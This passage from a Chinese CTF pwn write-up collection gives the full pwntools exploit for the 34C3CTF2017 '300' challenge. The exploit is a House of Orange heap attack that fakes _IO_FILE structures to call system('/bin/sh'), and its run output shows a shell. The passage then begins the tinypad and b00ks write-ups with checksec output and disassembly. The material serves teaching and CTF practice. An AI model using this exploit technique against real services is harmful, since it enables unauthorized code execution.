alloc(5) # abort routine
io.interactive()
最后触发异常处理， malloc_printerr -> __libc_message -> __GI_abort ->
_IO_flush_all_lockp -> __GI__IO_str_finish ，获得 shell。
开启 ASLR，Bingo!!!
$ python exp.py
[+] Starting local process './300': pid 5158
[*] libc_base address: 0x7efdcef24000
[*] heap address: 0x5624a7a3c000
[*] _IO_list_all address: 0x7efdcf2e6500
[*] system address: 0x7efdcef696a0
[*] /bin/sh address: 0x7efdcf0aec40
[*] _IO_wstr_finish address: 0x7efdcf2e1c90
[*] Switching to interactive mode
*** Error in `./300': malloc(): memory corruption: 0x00007efdcf2
e6500 ***
======= Backtrace: =========
$ whoami
firmy
exploit
完整的 exp 如下：
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'
io = process(['./300'], env={'LD_PRELOAD':'./libc-2.24.so'})
libc = ELF('libc-2.24.so')
def alloc(idx):
1381
6.1.26 pwn 34C3CTF2017 300
io.sendlineafter("free\n", '1')
io.sendlineafter("(0-9)\n", str(idx))
def write(idx, data):
io.sendlineafter("free\n", '2')
io.sendlineafter("(0-9)\n", str(idx))
io.sendline(data)
def printt(idx):
io.sendlineafter("free\n", '3')
io.sendlineafter("(0-9)\n", str(idx))
def free(idx):
io.sendlineafter("free\n", '4')
io.sendlineafter("(0-9)\n", str(idx))
def leak():
global libc_base
global heap_addr
alloc(0)
alloc(1)
alloc(2)
alloc(3)
alloc(4)
free(1)
free(3)
printt(1)
libc_base = u64(io.recvn(6).ljust(8, '\x00')) - 0x3c1b58
printt(3)
heap_addr = u64(io.recvn(6).ljust(8, '\x00')) - 0x310
log.info("libc_base address: 0x%x" % libc_base)
log.info("heap address: 0x%x" % heap_addr)
def house_of_orange():
io_list_all = libc_base + libc.symbols['_IO_list_all']
system_addr = libc_base + libc.symbols['system']
1382
6.1.26 pwn 34C3CTF2017 300
bin_sh_addr = libc_base + libc.search('/bin/sh\x00').next()
io_wstr_finish = libc_base + 0x3bdc90
fake_chunk = heap_addr + 0x310 * 4 + 0x20
fake_chunk_bk = heap_addr + 0x310 * 3
log.info("_IO_list_all address: 0x%x" % io_list_all)
log.info("system address: 0x%x" % system_addr)
log.info("/bin/sh address: 0x%x" % bin_sh_addr)
log.info("_IO_wstr_finish address: 0x%x" % io_wstr_finish)
stream = p64(0) + p64(0x61) # fake heade
r # fp
stream += p64(0) + p64(fake_chunk_bk) # fake bk po
inter
stream += p64(0) # fp->_IO_wr
ite_base
stream += p64(0xffffffff) # fp->_IO_wr
ite_ptr
stream += p64(bin_sh_addr) # fp->_IO_wr
ite_end # fp->wide_data->buf_base
stream = stream.ljust(0x74, '\x00')
stream += p64(0) # fp->_flags2
stream = stream.ljust(0xa0, '\x00')
stream += p64(fake_chunk) # fp->_wide_
data
stream = stream.ljust(0xc0, '\x00')
stream += p64(0) # fp->_mode
payload = "A" * 0x10
payload += stream
payload += p64(0) * 2
payload += p64(io_wstr_finish - 0x18) # _IO_FILE_p
lus->vtable - 0x8
payload += p64(0)
payload += p64(system_addr) # ((_IO_strf
ile *) fp)->_s._free_buffer
write(4, payload)
1383
6.1.26 pwn 34C3CTF2017 300
payload = p64(0) + p64(fake_chunk) # unsorted_b
in->TAIL->bk
write(1, payload)
alloc(5)
alloc(6) # put fake c
hunk in smallbins[5]
free(5) # put a chun
k in unsorted bin
write(5, p64(0) + p64(io_list_all - 0x10)) # bk pointer
alloc(5) # unsorted b
in attack
def pwn():
alloc(5) # abort routine
io.interactive()
if __name__ == '__main__':
leak()
house_of_orange()
pwn()
参考资料
https://ctftime.org/task/5172
1384
6.1.27 pwn SECCONCTF2016 tinypad
6.1.27 pwn SECCONCTF2016 tinypad
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file tinypad
tinypad: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dy
namically linked, interpreter /lib64/ld-linux-x86-64.so.2, for G
NU/Linux 2.6.32, BuildID[sha1]=1333a912c440e714599a86192a918178f
187d378, not stripped
$ checksec -f tinypad
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Full RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 0 4 tinypad
$ strings libc-2.19.so | grep "GNU C"
GNU C Library (Ubuntu EGLIBC 2.19-0ubuntu6.9) stable release ver
sion 2.19, by Roland McGrath et al.
Compiled by GNU CC version 4.8.4.
题目解析
漏洞利用
参考资料
https://ctftime.org/task/3189
1385
6.1.27 pwn SECCONCTF2016 tinypad
1386
6.1.28 pwn ASISCTF2016 b00ks
6.1.28 pwn ASISCTF2016 b00ks
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file b00ks
b00ks: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), d
ynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for
GNU/Linux 2.6.24, BuildID[sha1]=cdcd9edea919e679ace66ad54da9281d
3eb09270, stripped
$ checksec -f b00ks
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Full RELRO No canary found NX enabled PIE enabled
No RPATH No RUNPATH No 0 2 b00ks
$ strings libc-2.23.so | grep "GNU C"
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu10) stable release versi
on 2.23, by Roland McGrath et al.
Compiled by GNU CC version 5.4.0 20160609.
64 位程序，开启了 FULL RELRO、NX 和 PIE。
在 Ubuntu 16.04 上玩一下：
$ ./b00ks
Welcome to ASISCTF book library
Enter author name: AAAA
1. Create a book
2. Delete a book
1387
6.1.28 pwn ASISCTF2016 b00ks
3. Edit a book
4. Print book detail
5. Change current author name
6. Exit
> 1
Enter book name size: 5
Enter book name (Max 32 chars): BBBBB
Enter book description size: 5
Enter book description: CCCCC
1. Create a book
2. Delete a book
3. Edit a book
4. Print book detail
5. Change current author name
6. Exit
> 3
Enter the book id you want to edit: 1
Enter new book description: DDDDD
1. Create a book
2. Delete a book
3. Edit a book
4. Print book detail
5. Change current author name
6. Exit
> 4
ID: 1
Name: BBBBB
Description: DDDDD
Author: AAAA
1. Create a book
2. Delete a book
3. Edit a book
4. Print book detail
5. Change current author name
6. Exit
1388
6.1.28 pwn ASISCTF2016 b00ks
> 2
Enter the book id you want to delete: 1
1. Create a book
2. Delete a book
3. Edit a book
4. Print book detail
5. Change current author name
6. Exit
> 5
Enter author name: EEEE
1. Create a book
2. Delete a book
3. Edit a book
4. Print book detail
5. Change current author name
6. Exit
> 6
Thanks to use our library software
程序让我们先输入一个 auther name，然后进入菜单，可以新建、删除、修改和打
印一个 book，还可以对 author name 进行修改。
题目解析
Enter author name
[0x000008e0]> pdf @ sub.Enter_author_name:_b6d
/ (fcn) sub.Enter_author_name:_b6d 80
| sub.Enter_author_name:_b6d ();
| ; CALL XREF from main (0x122f)
| ; CALL XREF from main (+0xe0)
| 0x00000b6d push rbp
| 0x00000b6e mov rbp, rsp
| 0x00000b71 lea rdi, str.Enter_author_name:
; 0x13fb ; "Enter author name: " ; const char *format
| 0x00000b78 mov eax, 0
1389
6.1.28 pwn ASISCTF2016 b00ks
| 0x00000b7d call sym.imp.printf
; int printf(const char *format)
| 0x00000b82 lea rax, [0x00202018]
; "@ "
| 0x00000b89 mov rax, qword [rax]
| 0x00000b8c mov esi, 0x20
; "@" ; void *buf
| 0x00000b91 mov rdi, rax
; int fildes
| 0x00000b94 call sub.read_9f5
; 调用 read_9f5([0x00202018], 0x20) 读入 author name
| 0x00000b99 test eax, eax
| ,= 0x00000bb6 mov eax, 0
| | ; CODE XREF from sub.Enter_author_name:_b6d (0xbb4)
| `--> 0x00000bbb pop rbp
\ 0x00000bbc ret
[0x000008e0]> px 8 @ 0x00202018
- offset - 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789A
BCDEF
0x00202018 4020 2000 0000 0000 @ .....
程序首先调用函数 read_9f5() 读入 author name 到 [0x00202018] ，即
0x00202040 。
函数 read_9f5() 如下：
[0x000008e0]> pdf @ sub.read_9f5
/ (fcn) sub.read_9f5 130
| sub.read_9f5 (int arg1, signed int arg2);
1390
6.1.28 pwn ASISCTF2016 b00ks
| ; var signed int local_1ch @ rbp-0x1c
| ; var int local_18h @ rbp-0x18